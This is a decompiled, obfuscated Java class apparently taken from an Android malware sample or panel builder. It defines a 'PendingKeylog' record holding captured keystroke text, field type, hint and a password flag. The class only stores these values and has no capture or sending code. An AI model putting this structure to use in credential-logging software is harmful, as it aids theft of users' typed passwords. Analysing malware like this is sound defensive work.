package v.s;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class meoyWy7uMVp1IjcAV {
    public final boolean Ee8d2j4S9Vm5yGuR;
    public final String JXn4Qf7zpnLjP5;
    public final NxAMaDFbSCxW6M03f dDIMxZXP1V8HdM;
    public final String vekpFI4d1Nc4fakF;
    public final String w9sT1Swbhx3hs;

    public meoyWy7uMVp1IjcAV(NxAMaDFbSCxW6M03f nxAMaDFbSCxW6M03f, String str, String str2, String str3, boolean z) {
        this.dDIMxZXP1V8HdM = nxAMaDFbSCxW6M03f;
        this.w9sT1Swbhx3hs = str;
        this.vekpFI4d1Nc4fakF = str2;
        this.JXn4Qf7zpnLjP5 = str3;
        this.Ee8d2j4S9Vm5yGuR = z;
    }

    private static /* synthetic */ void bdkxu() {
    }

    public final boolean equals(Object obj) {
        if (this == obj) {
            return true;
        }
        if (!(obj instanceof meoyWy7uMVp1IjcAV)) {
            return false;
        }
        meoyWy7uMVp1IjcAV meoywy7umvp1ijcav = (meoyWy7uMVp1IjcAV) obj;
        return okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(this.dDIMxZXP1V8HdM, meoywy7umvp1ijcav.dDIMxZXP1V8HdM) && okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(this.w9sT1Swbhx3hs, meoywy7umvp1ijcav.w9sT1Swbhx3hs) && okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(this.vekpFI4d1Nc4fakF, meoywy7umvp1ijcav.vekpFI4d1Nc4fakF) && okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(this.JXn4Qf7zpnLjP5, meoywy7umvp1ijcav.JXn4Qf7zpnLjP5) && this.Ee8d2j4S9Vm5yGuR == meoywy7umvp1ijcav.Ee8d2j4S9Vm5yGuR;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r0v6, types: [int] */
    /* JADX WARN: Type inference failed for: r1v2, types: [int] */
    /* JADX WARN: Type inference failed for: r1v3 */
    /* JADX WARN: Type inference failed for: r1v4 */
    public final int hashCode() {
        int iJXn4Qf7zpnLjP5 = Y9mRyRdkl5FOcwb66V6.JXn4Qf7zpnLjP5(this.JXn4Qf7zpnLjP5, Y9mRyRdkl5FOcwb66V6.JXn4Qf7zpnLjP5(this.vekpFI4d1Nc4fakF, Y9mRyRdkl5FOcwb66V6.JXn4Qf7zpnLjP5(this.w9sT1Swbhx3hs, this.dDIMxZXP1V8HdM.hashCode() * 31, 31), 31), 31);
        boolean z = this.Ee8d2j4S9Vm5yGuR;
        ?? r1 = z;
        if (z) {
            r1 = 1;
        }
        return iJXn4Qf7zpnLjP5 + r1;
    }

    public final String toString() {
        return "PendingKeylog(entry=" + this.dDIMxZXP1V8HdM + ", fullText=" + this.w9sT1Swbhx3hs + ", fieldType=" + this.vekpFI4d1Nc4fakF + ", hint=" + this.JXn4Qf7zpnLjP5 + ", isPassword=" + this.Ee8d2j4S9Vm5yGuR + ")";
    }
}
